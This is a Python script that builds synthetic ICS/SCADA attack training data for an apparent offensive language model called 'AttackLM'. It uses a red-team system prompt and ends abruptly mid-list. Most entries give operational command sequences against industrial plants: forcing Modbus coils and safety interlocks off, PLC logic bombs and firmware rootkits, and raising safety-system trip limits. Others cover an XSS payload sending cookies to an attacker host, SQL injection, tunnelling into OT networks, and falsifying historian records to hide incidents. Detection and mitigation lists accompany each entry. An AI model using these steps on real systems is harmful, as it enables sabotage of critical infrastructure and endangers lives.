#!/usr/bin/env python3
"""acquire_ics_dataset.py — Generate synthetic ICS/SCADA attack training pairs
for AttackLM bucket format.

Covers: Modbus/TCP exploitation, PLC attacks, SCADA network intrusion,
industrial ransomware, OT protocol analysis, HMI attacks,
engineering workstation compromise.

Output: data/datasets/buckets/ics/attacks/data_synth.jsonl
        data/datasets/buckets/ics/attacks/metadata.json

Usage:
    python scripts/acquire_ics_dataset.py --count 10
"""

from __future__ import annotations

import json
import random
from datetime import datetime, timezone
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent
BUCKET_DIR = BASE_DIR / "data" / "datasets" / "buckets" / "ics" / "attacks"
DATA_FILE = BUCKET_DIR / "data_synth.jsonl"
META_FILE = BUCKET_DIR / "metadata.json"

SEED = 42
SOURCE_NAME = "ics_synthetic"
LICENSE = "MIT"
SYSTEM_PROMPT = (
    "You are an authorized Red Team ICS specialist conducting security testing. "
    "You provide precise adversary emulation techniques for vulnerability assessment "
    "and detection engineering per MITRE ATT&CK ICS, NIST SP 800-82, and IEC 62443."
)

ENVIRONMENT_TYPES = [
    "power generation facility",
    "water treatment plant",
    "manufacturing plant",
    "oil and gas pipeline",
    "electrical grid substation",
    "chemical processing plant",
    "pharmaceutical manufacturing",
    "food and beverage production",
    "building automation system",
    "transportation infrastructure",
]

SEVERITY_LEVELS = ["critical", "high", "medium", "low"]

TESTING_FRAMEWORKS = [
    "MITRE ATT&CK ICS",
    "NIST SP 800-82",
    "IEC 62443",
    "NERC CIP",
    "NIST SP 800-115",
    "PTES",
]

ATTACKS: list[dict] = [
    # === MODBUS/TCP ===
    {
        "category": "modbus",
        "name": "Modbus/TCP Register Manipulation",
        "mitre_ids": ["T0831"],
        "desc": "Reading and writing Modbus holding registers to manipulate industrial processes.",
        "steps": "1. Discover Modbus devices: `nmap -p 502 --script modbus-discover <target>`\n2. Identify unit IDs: `python3 modbus_scan.py --ip <target> --units 1-247`\n3. Read holding registers: `python3 -c \"from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('<target>'); c.read_holding_registers(address=0,count=10,unit=1)\"`\n4. Write arbitrary values: `c.write_registers(address=0,values=[65535]*10,unit=1)`\n5. Manipulate process: change setpoint register to unsafe value\n6. Monitor process response: read input registers for sensor values",
        "detection": [
            "Modbus traffic to unexpected IPs",
            "Write function code (0x06, 0x10) from non-OT sources",
            "Register writes outside operational patterns",
            "Modbus traffic crossing IT/OT boundary",
        ],
        "mitigations": [
            "Modbus TCP gateway with authentication",
            "Network segmentation (VLAN/ACL)",
            "Protocol-aware firewalls",
            "Register value monitoring and alerting",
            "Modbus/TCP over TLS where supported",
        ],
    },
    {
        "category": "modbus",
        "name": "Modbus/TCP Coil Manipulation Attack",
        "mitre_ids": ["T0831"],
        "desc": "Manipulating Modbus coils to change the state of physical outputs (pumps, valves, motors).",
        "steps": "1. Enumerate coils: `c.read_coils(address=0, count=100, unit=1)`\n2. Identify critical coils: map coil addresses to physical devices (pump ON/OFF, valve OPEN/CLOSE)\n3. Write coil to change state: `c.write_coil(address=0, value=True, unit=1)` (turn ON)\n4. Force coil OFF: `c.write_coil(address=0, value=False, unit=1)` (turn OFF)\n5. Rapid cycling attack: toggle coils rapidly to damage equipment\n6. Safety override: force safety interlock coils OFF",
        "detection": [
            "Coil write commands from non-OT network",
            "Rapid coil state changes",
            "Coil writes to safety-critical addresses",
            "Modbus function code 5 (write single coil) anomalies",
        ],
        "mitigations": [
            "Write protection on critical coils",
            "Modbus firewall filtering write commands",
            "Hardwired safety interlocks (not software-controlled)",
            "Process variable monitoring",
            "Rate limiting on Modbus writes",
        ],
    },
    {
        "category": "modbus",
        "name": "Modbus Network Reconnaissance",
        "mitre_ids": ["T0846"],
        "desc": "Scanning and enumerating Modbus devices on an industrial network.",
        "steps": "1. Network discovery: `nmap -sT -p 502 <subnet>`\n2. Modbus device enumeration: `nmap --script modbus-discover -p 502 <target>`\n3. Unit ID brute force: `for i in $(seq 1 247); do python3 -c \"from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('<target>'); r=c.read_holding_registers(0,1,unit=$i); print(f'Unit $i: {r}')\"; done`\n4. Register mapping: read all registers to map process variables\n5. Function code support: `for fc in [1,2,3,4,5,6,15,16]; do echo \"FC $fc: $(python3 modbus_fc_test.py <target> $fc)\"; done`",
        "detection": [
            "Port 502 scanning from IT network",
            "Modbus unit ID enumeration patterns",
            "Register read attempts across all addresses",
            "Multiple function code probes in short period",
        ],
        "mitigations": [
            "Network segmentation between IT and OT",
            "Modbus-aware IDS",
            "Port-based ACLs on switches",
            "Device hardening (disable unused function codes)",
        ],
    },
    {
        "category": "modbus",
        "name": "Modbus/TCP Function Code Fuzzing",
        "mitre_ids": ["T0859"],
        "desc": "Fuzzing Modbus/TCP function codes to discover implementation flaws and crash devices for vulnerability assessment.",
        "steps": "1. Identify target Modbus device and firmware version: `nmap -sV -p 502 <target>`\n2. Enumerate supported function codes: `python3 modbus_enum_fc.py --ip <target> --units 1-247`\n3. Fuzz each function code with malformed data: `python3 modbus_fuzzer.py --ip <target> --fc 1-127 --unit 1 --strategy rand`\n4. Fuzz quantity field (request 65535 registers): `python3 modbus_fuzzer.py --ip <target> --fc 3 --quantity 0xFFFF --unit 1`\n5. Fuzz with invalid unit IDs: `python3 modbus_fuzzer.py --ip <target> --fc 3 --unit 255`\n6. Monitor device for crashes, exceptions, or unexpected responses: `tcpdump -i eth0 port 502 -w fuzz_results.pcap`\n7. Document crashes and exceptions per IEC 62443 vulnerability assessment methodology",
        "detection": [
            "Unusual Modbus function codes not in baseline",
            "Exception responses from Modbus devices",
            "Device resets or communication timeouts after fuzz traffic",
            "Large register quantity requests exceeding device limits",
        ],
        "mitigations": [
            "Input validation on Modbus gateways",
            "Rate limiting and connection throttling",
            "Protocol-aware firewalls with function code whitelisting",
            "Firmware updates addressing known fuzzing vulnerabilities",
            "Network segmentation isolating Modbus devices",
        ],
    },
    {
        "category": "modbus",
        "name": "Modbus TCP Replay Attack",
        "mitre_ids": ["T0857"],
        "desc": "Capturing and replaying Modbus TCP commands to replicate legitimate operations for unauthorized control during security testing.",
        "steps": "1. Capture Modbus traffic: `tcpdump -i eth0 port 502 -w modbus_capture.pcap`\n2. Analyze captured packets: `python3 modbus_parse.py --pcap modbus_capture.pcap`\n3. Identify target transactions: filter for write operations (FC 5, 6, 15, 16)\n4. Extract Modbus frames: `python3 modbus_extract.py --pcap modbus_capture.pcap --fc 5,6,15,16 --output replay_cmds.json`\n5. Modify transaction IDs if needed: `python3 modbus_replay.py --input replay_cmds.json --modify-tid`\n6. Replay commands: `python3 modbus_replay.py --ip <target> --input replay_cmds.json --delay 1000`\n7. Verify replay success by reading affected registers: `c.read_holding_registers(address=0, count=10, unit=1)`",
        "detection": [
            "Duplicate Modbus transaction IDs",
            "Replay of old Modbus frames with stale timestamps",
            "Modbus commands outside expected sequence patterns",
            "Time gap anomalies between request and execution",
        ],
        "mitigations": [
            "Modbus/TCP sequence number validation",
            "Timestamp-based replay protection in Modbus gateways",
            "Network encryption (Modbus/TCP Security extension)",
            "Transaction ID monotonic enforcement",
            "Protocol-aware intrusion detection for replay patterns",
        ],
    },
    {
        "category": "modbus",
        "name": "Modbus RTU over TCP Exploitation",
        "mitre_ids": ["T0831"],
        "desc": "Exploiting Modbus RTU encapsulated in TCP to target serial-connected devices through protocol converters for vulnerability assessment.",
        "steps": "1. Discover Modbus TCP-to-RTU gateways: `nmap -p 502 --script modbus-discover <subnet>`\n2. Identify RTU slave mapping: `python3 modbus_rtu_scan.py --gateway <target> --slaves 1-247`\n3. Enumerate RTU devices behind gateway: query each slave ID for register maps\n4. Read RTU registers through gateway: `python3 modbus_rtu_read.py --gateway <target> --slave 5 --address 0 --count 20`\n5. Write to RTU device through gateway: `python3 modbus_rtu_write.py --gateway <target> --slave 5 --address 0 --value 32767`\n6. Exploit gateway misconfiguration: bypass RTU authentication if gateway lacks access controls\n7. Target RTU-specific vulnerabilities: overflow 8-bit slave addressing, exploit CRC handling in encapsulation",
        "detection": [
            "Modbus RTU-over-TCP traffic from non-OT sources",
            "Unexpected slave ID access patterns through gateway",
            "Gateway configuration changes outside maintenance windows",
            "RTU register writes bypassing gateway access controls",
        ],
        "mitigations": [
            "Gateway access control lists for RTU slave addressing",
            "Modbus TCP-to-RTU gateway authentication",
            "Network segmentation isolating gateway devices",
            "RTU device-level write protection",
            "Gateway firmware updates and security hardening",
        ],
    },
    {
        "category": "modbus",
        "name": "Modbus Response Injection",
        "mitre_ids": ["T0831"],
        "desc": "Injecting forged Modbus response frames to欺骗 a master into accepting falsified sensor data during security testing.",
        "steps": "1. Position on network between Modbus master and slaves: ARP spoofing or VLAN hopping\n2. Capture legitimate Modbus traffic: `tcpdump -i eth0 port 502 -w modbus.pcap`\n3. Analyze response timing and structure: `python3 modbus_response_analyze.py --pcap modbus.pcap`\n4. Craft forged response: `python3 modbus_inject.py --slave 5 --fc 3 --address 0 --values [300,450,999] --unit 1`\n5. Race legitimate response: inject before real slave responds\n6. Alternative: suppress legitimate response with RST packet and inject replacement\n7. Verify injection: read affected registers from master to confirm falsified values accepted",
        "detection": [
            "Duplicate Modbus response frames for same transaction",
            "Response timing anomalies (faster-than-expected responses)",
            "Modbus response from IP addresses not matching slave devices",
            "TCP sequence number inconsistencies in response frames",
        ],
        "mitigations": [
            "Modbus/TCP Security extension with authentication",
            "Response validation on master (expected source IP checking)",
            "Network segmentation preventing MITM positioning",
            "Encrypted Modbus communication where supported",
            "Protocol-aware IDS detecting injection patterns",
        ],
    },
    {
        "category": "modbus",
        "name": "Modbus Broadcast Address Abuse",
        "mitre_ids": ["T0831"],
        "desc": "Exploiting Modbus broadcast address (unit ID 0) to send commands to all slaves simultaneously for security testing and vulnerability assessment.",
        "steps": "1. Identify Modbus devices responding to broadcast: `python3 modbus_scan.py --ip <target> --units 0,1-247`\n2. Test broadcast write: `c.write_registers(address=0, values=[0xFFFF]*10, unit=0)`\n3. Verify all devices received command: read registers from each slave individually\n4. Exploit: broadcast STOP command to all devices simultaneously\n5. Broadcast force coil: `c.write_coil(address=0, value=False, unit=0)` (force all outputs OFF)\n6. Broadcast extended memory write: overwrite configuration across all devices\n7. Document which devices accept broadcast commands per NIST SP 800-82 assessment methodology",
        "detection": [
            "Modbus traffic to unit ID 0 (broadcast address)",
            "Write commands to broadcast address from non-OT sources",
            "Simultaneous state changes across multiple devices",
            "Broadcast function code anomalies",
        ],
        "mitigations": [
            "Disable broadcast address support on critical devices",
            "Modbus gateway filtering broadcast commands",
            "Network segmentation limiting broadcast propagation",
            "Protocol-aware firewalls blocking broadcast writes",
            "Device configuration disabling broadcast write acceptance",
        ],
    },
    # === PLC ATTACKS ===
    {
        "category": "plc",
        "name": "PLC Logic Modification Attack",
        "mitre_ids": ["T0832"],
        "desc": "Modifying PLC ladder logic to change process behavior while avoiding detection.",
        "steps": "1. Identify PLC: `nmap -sT -p 102,44818,2222 <target>` (S7, EtherNet/IP, Moxa)\n2. Connect to PLC: `python3 s7_scan.py --ip <target>`\n3. Read PLC program: `python3 snap7_read.py --ip <target> --db 1 --size 256`\n4. Modify logic: change setpoint, remove safety interlock, add malicious rung\n5. Download modified program: `python3 snap7_download.py --ip <target> --file modified_program.mwp`\n6. Force PLC to run modified program: `python3 s7_plc_control.py --ip <target> --start`\n7. Verify: read process values to confirm modification took effect",
        "detection": [
            "PLC program download events",
            "Logic changes outside maintenance windows",
            "Unauthorized programming device connections",
            "PLC state change from RUN to STOP to RUN",
        ],
        "mitigations": [
            "PLC program password protection",
            "Physical write protect switches",
            "Change detection for PLC programs",
            "Network monitoring for PLC programming connections",
            "Regular PLC program hash verification",
        ],
    },
    {
        "category": "plc",
        "name": "PLC Denial of Service via Invalid Packets",
        "mitre_ids": ["T0814"],
        "desc": "Sending malformed packets to crash or disable a PLC, causing process disruption.",
        "steps": "1. Identify PLC model and firmware version\n2. Research known PLC vulnerabilities: CVEs for the specific model\n3. Craft malformed packet: `python3 plc_crash.py --ip <target> --type malformed_cotp`\n4. Send oversized S7 packet: `python3 -c \"from scapy.all import *; send(IP(dst='<target>')/TCP(dport=102)/Raw(load=b'\\x03\\x00\\x00\\x1f\\x02\\xf0\\x80' + b'\\xff'*65535))\"`\n5. Send invalid COTP DT packet: crash PLC communication module\n6. Monitor PLC: verify STOP mode or communication loss\n7. Physical impact: process enters fail-safe or unsafe state",
        "detection": [
            "Malformed packet detection in OT network",
            "PLC STOP mode transition",
            "Communication loss with PLC",
            "Unexpected PLC restart events",
        ],
        "mitigations": [
            "PLC firmware updates and patches",
            "Network IDS for malformed packet detection",
            "PLC watchdog timers",
            "Redundant PLCs for critical processes",
            "Rate limiting on PLC communication ports",
        ],
    },
    {
        "category": "plc",
        "name": "PLC Firmware Extraction and Analysis",
        "mitre_ids": ["T0832"],
        "desc": "Extracting PLC firmware for vulnerability analysis and reverse engineering.",
        "steps": "1. Identify PLC model and firmware: `nmap -sV -p 102 <target>`\n2. Read firmware from PLC: `python3 snap7_read_firmware.py --ip <target> --output firmware.bin`\n3. Alternatively: download firmware from vendor website\n4. Extract firmware: `binwalk firmware.bin` to find embedded filesystem\n5. Analyze: `strings firmware.bin | grep -i 'password\\|key\\|auth'`\n6. Reverse engineer PLC OS: find buffer overflow vulnerabilities\n7. Create exploit for discovered vulnerability",
        "detection": [
            "Firmware download requests to PLC",
            "Unusually large data transfers from PLC",
            "Firmware update during non-maintenance windows",
            "Unknown device connecting to PLC programming port",
        ],
        "mitigations": [
            "Firmware integrity verification",
            "Encrypted firmware distribution",
            "Network segmentation for PLC programming ports",
            "Firmware change management process",
        ],
    },
    {
        "category": "plc",
        "name": "PLC Firmware Modification with Rootkit",
        "mitre_ids": ["T0832"],
        "desc": "Modifying PLC firmware to embed persistent rootkit that survives program downloads for advanced vulnerability assessment per MITRE ATT&CK ICS.",
        "steps": "1. Extract legitimate firmware: `python3 snap7_read_firmware.py --ip <target> --output firmware_original.bin`\n2. Decompile firmware: `binwalk -e firmware_original.bin` to extract bootloader and OS components\n3. Identify modification points: `strings firmware_original.bin | grep -i 'boot\\|init\\|handler'`\n4. Patch firmware binary: inject persistent code at identified offset\n5. Create firmware rootkit: `python3 firmware_patcher.py --input firmware_original.bin --patch rootkit_patch.bin --output firmware_modified.bin`\n6. Upload modified firmware: `python3 snap7_download_firmware.py --ip <target> --file firmware_modified.bin`\n7. Verify persistence: `python3 snap7_read_firmware.py --ip <target> --verify firmware_modified.bin`\n8. Test persistence across PLC program downloads: reload ladder logic and verify rootkit survives",
        "detection": [
            "Firmware hash mismatches compared to known-good baseline",
            "Unexpected firmware update events",
            "Firmware download from unauthorized sources",
            "PLC behavior anomalies not explained by program changes",
            "Boot time changes or unexpected network connections from PLC",
        ],
        "mitigations": [
            "Secure boot with firmware signature verification",
            "Firmware integrity monitoring with hash comparison",
            "Hardware-based write protection for firmware storage",
            "Regular firmware validation against vendor-signed images",
            "Network segmentation preventing unauthorized firmware uploads per IEC 62443",
        ],
    },
    {
        "category": "plc",
        "name": "PLC Logic Bomb Injection",
        "mitre_ids": ["T0859"],
        "desc": "Injecting time-delayed or condition-triggered malicious logic into PLC programs for adversarial emulation testing per MITRE ATT&CK ICS.",
        "steps": "1. Read existing PLC program: `python3 snap7_read.py --ip <target> --db 1 --size 4096`\n2. Analyze existing logic structure: identify timer and counter rungs for modification points\n3. Design logic bomb: condition-triggered malicious behavior (e.g., after N cycles, after date, on specific input pattern)\n4. Create malicious rung: add timer that triggers after 10000 scans and forces all outputs OFF\n5. Inject into existing program: `python3 plc_inject.py --ip <target> --original program.awl --inject logic_bomb.awl --output infected_program.awl`\n6. Download infected program: `python3 snap7_download.py --ip <target> --file infected_program.awl`\n7. Monitor for trigger condition: `python3 plc_monitor.py --ip <target> --watch scan_counter --threshold 10000`",
        "detection": [
            "PLC program size changes without maintenance activity",
            "Unexpected timer or counter additions in PLC logic",
            "Logic changes outside maintenance windows",
            "Anomalous PLC scan time increases",
            "Hidden rungs detected during program comparison",
        ],
        "mitigations": [
            "PLC program integrity monitoring with hash comparison",
            "Regular offline program comparison against known-good baseline",
            "PLC program change management with approval workflows",
            "Network access control restricting PLC programming per IEC 62443",
            "Safety instrumented systems independent of PLC logic",
        ],
    },
    {
        "category": "plc",
        "name": "PLC Communication Hijacking (MITM between HMI and PLC)",
        "mitre_ids": ["T0830"],
        "desc": "Intercepting and modifying communications between HMI and PLC using man-in-the-middle techniques for security testing per NIST SP 800-82.",
        "steps": "1. Identify HMI-PLC communication paths: `nmap -sT -p 102,44818 <subnet>` (S7comm or EtherNet/IP)\n2. Position on network: VLAN hopping, compromised switch, or ARP spoofing\n3. ARP spoofing: `arpspoof -i eth0 -t <plc_ip> <hmi_ip> && arpspoof -i eth0 -t <hmi_ip> <plc_ip>`\n4. Enable IP forwarding: `echo 1 > /proc/sys/net/ipv4/ip_forward`\n5. Intercept and modify: `python3 plc_mitm.py --proto s7comm --target-plc <plc_ip> --target-hmi <hmi_ip> --modify-db1-offset-10 value=999`\n6. Suppress alarm data: filter alarm packets from PLC to HMI\n7. Verify: compare HMI display values with actual PLC register values",
        "detection": [
            "ARP table changes on HMI or PLC network interfaces",
            "Duplicate IP address alerts in OT network",
            "Protocol sequence number anomalies in S7comm or CIP traffic",
            "Packet modification signatures in IDS",
            "HMI displayed values disagreeing with PLC actual values",
        ],
        "mitigations": [
            "Static ARP entries for critical HMI-PLC pairs",
            "802.1X network access control per IEC 62443",
            "Protocol authentication (S7comm password protection, CIP Security)",
            "Encrypted industrial protocol communication",
            "Network monitoring for ARP anomalies and MAC flapping",
        ],
    },
    {
        "category": "plc",
        "name": "PLC Enumeration and Fingerprinting",
        "mitre_ids": ["T0846"],
        "desc": "Enumerating and fingerprinting PLCs to identify model, firmware, and capabilities for vulnerability assessment per MITRE ATT&CK ICS.",
        "steps": "1. Discover PLCs: `nmap -sT -p 102,44818,2222,789 <subnet>` (S7, EtherNet/IP, Moxa, Ovation)\n2. S7 PLC fingerprint: `nmap --script s7-info -p 102 <target>`\n3. EtherNet/IP device info: `nmap -sU -p 44818 --script enip-info <target>`\n4. Banner grabbing: `nc <target> 102` and analyze COTP response\n5. SNMP enumeration: `snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1` (many PLCs have SNMP enabled)\n6. Web interface fingerprint: `curl -k https://<target>/` for PLCs with web servers\n7. CIP service enumeration: `python3 cip_enum.py --ip <target>`\n8. Compile fingerprint database: model, firmware, modules, vulnerability mapping",
        "detection": [
            "Port scanning targeting PLC communication ports (102, 44818, 2222)",
            "SNMP enumeration from non-OT sources",
            "S7-info script detection in network traffic",
            "Multiple connection attempts to PLC from unknown IPs",
            "CIP service enumeration traffic patterns",
        ],
        "mitigations": [
            "Disable unnecessary services (SNMP, HTTP) on PLCs per IEC 62443 hardening",
            "Network segmentation with ACLs for PLC subnets",
            "PLC port-based access control lists",
            " intrusion detection monitoring for enumeration patterns",
            "Firmware updates to remove information disclosure in banners",
        ],
    },
    {
        "category": "plc",
        "name": "PLC Program Download without Authentication",
        "mitre_ids": ["T0832"],
        "desc": "Downloading PLC programs without authentication to steal proprietary logic and process configurations per NIST SP 800-82 assessment methodology.",
        "steps": "1. Discover PLC: `nmap -sT -p 102 <target>`\n2. Check authentication level: `python3 s7_get_protection.py --ip <target>`\n3. Attempt connection without password: `python3 snap7_connect.py --ip <target> --no-auth`\n4. If no protection: read DB blocks: `python3 snap7_read.py --ip <target> --db 1 --size 65535 --output db1.bin`\n5. Read all program blocks: `python3 snap7_read_all.py --ip <target> --output plc_program/`\n6. Download complete PLC program: `python3 snap7_download.py --ip <target> --file full_program.mwp --all-blocks`\n7. Analyze stolen logic: decompile ladder logic to understand process control and identify safety interlocks",
        "detection": [
            "PLC program upload/download events outside maintenance windows",
            "Program read requests from unauthorized IP addresses",
            "Large data transfers from PLC programming ports",
            "PLC protection level reads followed by program downloads",
            "Multiple block read requests in sequence",
        ],
        "mitigations": [
            "Enable PLC password protection (protection level 3)",
            "Network segmentation restricting PLC programming port access",
            "PLC key switch in RUN mode preventing downloads",
            "Access control lists on PLC gateway devices per IEC 62443",
            "Monitor and alert on all PLC program transfer events",
        ],
    },
    {
        "category": "plc",
        "name": "PLC Safety Instrumented System (SIS) Bypass",
        "mitre_ids": ["T0831"],
        "desc": "Bypassing or defeating Safety Instrumented System logic to disable safety interlocks for vulnerability assessment per MITRE ATT&CK ICS and IEC 62443.",
        "steps": "1. Identify SIS PLC: typically separate from BPCS, scan on dedicated network: `nmap -sT -p 102,44818 <sis_subnet>`\n2. Enumerate SIS logic blocks: `python3 snap7_read.py --ip <sis_plc> --list-blocks`\n3. Read safety interlock logic: `python3 snap7_read_db.py --ip <sis_plc> --db 1 --size 4096`\n4. Map safety functions: identify which inputs trigger shutdown outputs (temperature, pressure, level)\n5. Modify SIS setpoint: raise safety limit from 200C to 999C: `python3 snap7_write_db.py --ip <sis_plc> --db 1 --offset 100 --value 999`\n6. Disable SIS output: force safety shutdown output OFF: `python3 snap7_write_db.py --ip <sis_plc> --db 2 --offset 0 --value 0`\n7. Verify bypass: simulate over-limit condition and confirm SIS does not trip",
        "detection": [
            "SIS PLC program changes outside safety review windows",
            "SIS setpoint modifications exceeding safety limits",
            "SIS output forcing or override commands",
            "Communication to SIS from non-engineering workstations",
            "SIS bypass mode activation without proper authorization",
        ],
        "mitigations": [
            "Hardwired safety systems independent of PLC logic per IEC 61511",
            "SIS/BPCS network isolation per IEC 62443",
            "Safety PLC with write protection and authentication",
            "Safety interlock monitoring with independent hardwired circuits",
            "Regular safety function testing and proof testing per IEC 61511",
        ],
    },
    # === SCADA NETWORK ===
    {
        "category": "scada",
        "name": "SCADA HMI Compromise via Default Credentials",
        "mitre_ids": ["T0799"],
        "desc": "Exploiting default credentials on SCADA Human-Machine Interface systems.",
        "steps": "1. Discover HMI: `nmap -sV -p 80,443,8080,3389 <subnet>`\n2. Identify HMI software: check HTTP headers, page titles for vendor info\n3. Try default credentials: admin:admin, admin:password, operator:operator\n4. Common HMI defaults: Siemens WinCC (siemens/siemens), Wonderware (admin/admin), Ignition (admin/admin)\n5. If web-based: `hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'`\n6. Once authenticated: access process control screens, modify setpoints, disable alarms",
        "detection": [
            "Login attempts with known default credentials",
            "Multiple failed login attempts from same source",
            "Successful login from unusual location",
            "HMI configuration changes outside maintenance windows",
        ],
        "mitigations": [
            "Change all default credentials before deployment",
            "Multi-factor authentication for HMI access",
            "Network segmentation for HMI systems",
            "Account lockout policies",
            "Regular credential audits",
        ],
    },
    {
        "category": "scada",
        "name": "SCADA Man-in-the-Middle Attack",
        "mitre_ids": ["T0830"],
        "desc": "Intercepting and modifying communications between SCADA components.",
        "steps": "1. Identify SCADA protocol: Modbus/TCP, DNP3, IEC 61850, S7comm\n2. Position on network: VLAN hopping or compromised switch\n3. ARP spoofing: `arpspoof -i eth0 -t <plc_ip> <hmi_ip> && arpspoof -i eth0 -t <hmi_ip> <plc_ip>`\n4. Intercept with Ettercap: `ettercap -T -q -i eth0 -M arp:remote /<plc_ip>// /<hmi_ip>//`\n5. Modify packets in transit: change setpoint values, suppress alarms\n6. For S7comm: `python3 s7_mitm.py --target <plc_ip> --modify-db1-offset-10 value=65535`",
        "detection": [
            "ARP table changes in OT network",
            "Duplicate IP address alerts",
            "Protocol sequence number anomalies",
            "Packet modification signatures in IDS",
        ],
        "mitigations": [
            "Static ARP entries for critical devices",
            "802.1X network access control",
            "Protocol authentication (Modbus/TCP Security)",
            "Encrypted SCADA protocols where available",
            "Network monitoring for ARP anomalies",
        ],
    },
    {
        "category": "scada",
        "name": "DNP3 Outstation Compromise",
        "mitre_ids": ["T0831"],
        "desc": "Compromising DNP3 outstations to manipulate SCADA telemetry data.",
        "steps": "1. Discover DNP3 devices: `nmap -sT -p 20000 <subnet>`\n2. Enumerate outstations: `python3 dnp3_scan.py --ip <target>`\n3. Read analog inputs: `python3 dnp3_read.py --ip <target> --group 30 --variation 1-4`\n4. Modify analog outputs: `python3 dnp3_write.py --ip <target> --group 41 --variation 1 --value 0xFFFF`\n5. Freeze counters: send DNP3 freeze command to lock counter values\n6. Disable unsolicited reporting: prevent outstation from sending spontaneous data",
        "detection": [
            "DNP3 traffic from unauthorized sources",
            "Unexpected DNP3 function codes",
            "Analog value changes outside normal range",
            "DNP3 device address enumeration",
        ],
        "mitigations": [
            "DNP3 Secure Authentication (SA)",
            "Network segmentation for DNP3 devices",
            "DNP3-aware IDS/IPS",
            "Outstation data validation",
            "Master station comparison checks",
        ],
    },
    {
        "category": "scada",
        "name": "HMI Web Interface Exploitation",
        "mitre_ids": ["T0817"],
        "desc": "Exploiting vulnerabilities in SCADA HMI web interfaces for unauthorized access and process manipulation per MITRE ATT&CK ICS.",
        "steps": "1. Discover HMI web interfaces: `nmap -sV -p 80,443,8080,8443 <subnet>`\n2. Fingerprint HMI: `curl -k -I https://<target>/` check Server, X-Powered-By headers\n3. Directory enumeration: `gobuster dir -u https://<target> -w /usr/share/wordlists/dirb/common.txt -k`\n4. Find vulnerabilities: search CVEs for identified HMI vendor and version\n5. Exploit path traversal: `curl -k https://<target>/../../../etc/passwd`\n6. Exploit XSS in tag display: inject `<script>document.location='http://<attacker>/steal?c='+document.cookie</script>` into tag name field\n7. Exploit command injection: `https://<target>/api/process?cmd=start;id` if HMI has OS command interface\n8. Escalate to process control: use web session to modify setpoints and disable alarms",
        "detection": [
            "Web vulnerability scanning signatures on HMI interfaces",
            "Path traversal attempts in HMI web server logs",
            "XSS payloads in HMI tag name fields",
            "Command injection patterns in HMI API requests",
            "Unusual HTTP methods on HMI web endpoints",
        ],
        "mitigations": [
            "HMI web interface security hardening per IEC 62443",
            "Web Application Firewall (WAF) for HMI interfaces",
            "Input validation and output encoding in HMI web applications",
            "Network segmentation isolating HMI web interfaces from IT network",
            "Regular vulnerability scanning and patching of HMI software",
        ],
    },
    {
        "category": "scada",
        "name": "SCADA Historian Database Compromise",
        "mitre_ids": ["T0802"],
        "desc": "Compromising SCADA historian databases to steal process data and manipulate historical records per MITRE ATT&CK ICS and NIST SP 800-82.",
        "steps": "1. Discover historian: `nmap -sV -p 1433,3306,5432,5480 <subnet>` (SQL Server, MySQL, PostgreSQL, OSIsoft PI)\n2. Identify historian type: OSIsoft PI (5480), Wonderware Historian (1433), Ignition (8088)\n3. Try default credentials: `sa:sa`, `piadmin:piadmin`, `admin:admin`\n4. SQL injection on historian web interface: `https://<target>/api/tags?name=Pressure'+UNION+SELECT+1,@@version,3,4--`\n5. Access historian via ODBC/OLEDB: `python3 historian_query.py --server <target> --query \"SELECT * FROM piarchive..picomp2 WHERE tag='Pressure' AND timestep='1h'\"`\n6. Exfiltrate process data: export historical trends, alarm logs, operator actions\n7. Modify historical data: `UPDATE piarchive..picomp2 SET value=0 WHERE tag='Temperature' AND time>'2024-01-01'` to cover up incidents",
        "detection": [
            "Historian database connections from non-OT IP addresses",
            "SQL injection patterns in historian web interface logs",
            "Large data exports from historian during non-business hours",
            "Historical data modification events",
            "Default credential usage on historian systems",
        ],
        "mitigations": [
            "Strong authentication on historian databases per IEC 62443",
            "Network segmentation isolating historian from IT network",
            "Historian data integrity monitoring and tamper detection",
            "Regular credential rotation and removal of default accounts",
            "Database activity monitoring and anomaly detection",
        ],
    },
    {
        "category": "scada",
        "name": "SCADA Network Pivot via DMZ",
        "mitre_ids": ["T0802"],
        "desc": "Pivoting from IT network through DMZ into OT/SCADA network for lateral movement assessment per MITRE ATT&CK ICS.",
        "steps": "1. Initial foothold on IT network: compromised workstation or server\n2. Enumerate DMZ: `nmap -sT -p 80,443,3389,502,20000,4840 <dmz_subnet>`\n3. Identify DMZ jump hosts: `ping -a <dmz_range> | grep reply`\n4. Compromise DMZ server: exploit web app or use stolen credentials\n5. Pivot from DMZ to OT: `ssh -L 502:<ot_plc>:502 <dmz_host>` (forward Modbus)\n6. Alternatively: use compromised historian as pivot point (historian often straddles IT/OT)\n7. Establish persistent tunnel: `chisel server --reverse -p 8080` on DMZ host, `chisel client <dmz_host>:8080 R:502:<ot_plc>:502` on attacker\n8. Scan OT network from DMZ: `proxychains nmap -sT -p 502,102,44818 <ot_subnet>`",
        "detection": [
            "Unusual traffic patterns between DMZ and OT networks",
            "Historian server making unexpected outbound connections",
            "SSH tunnel processes on DMZ hosts",
            "Proxy or tunnel tool binaries detected on DMZ systems",
            "Network connections from DMZ to OT on industrial protocol ports",
        ],
        "mitigations": [
            "IT/OT network segmentation with strict DMZ policies per IEC 62443",
            "Unidirectional gateways (data diodes) for IT-to-OT data flow",
            "Network monitoring between DMZ and OT zones",
            "Jump host hardening with multi-factor authentication",
            "Regular network traffic analysis and anomaly detection per NERC CIP",
        ],
    },
    {
        "category": "scada",
        "name": "SCADA Protocol Gateway Exploitation",
        "mitre_ids": ["T0830"],
        "desc": "Exploiting protocol gateway devices that translate between IT and OT protocols for unauthorized access per MITRE ATT&CK ICS.",
        "steps": "1. Discover gateways: `nmap -sV -p 80,443,502,20000,4840 <subnet>` (devices listening on multiple protocol ports)\n2. Identify gateway type: Moxa, HMS Anybus, Digi, Red Lion, Hirschmann\n3. Access gateway web management: `curl -k https://<target>/` try default credentials (admin/admin, root/root)\n4. Enumerate protocol mappings: identify which IT protocols map to which OT protocols\n5. Exploit gateway CVE: search for known vulnerabilities in identified gateway model\n6. Modify protocol translation rules: change register mapping to send false data to OT side\n7. Use gateway as pivot: exploit gateway OS to gain shell and tunnel into OT network",
        "detection": [
            "Gateway management interface access from IT network",
            "Protocol translation rule modifications outside maintenance",
            "Unexpected connections from gateway to OT devices",
            "Gateway firmware modifications",
